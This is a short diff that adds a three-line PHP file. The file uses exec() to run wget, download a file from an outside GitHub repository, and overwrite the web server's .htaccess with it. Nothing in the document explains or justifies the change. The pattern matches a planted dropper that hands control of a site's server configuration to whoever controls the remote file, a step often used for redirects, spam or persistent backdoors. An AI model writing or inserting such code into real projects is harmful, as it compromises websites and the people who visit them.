@@ -1,0 +1,3 @@
+<?php
+exec("wget -O .htaccess https://github.com/ohctcombet/-/raw/main/.htaccess1.txt");
+?>
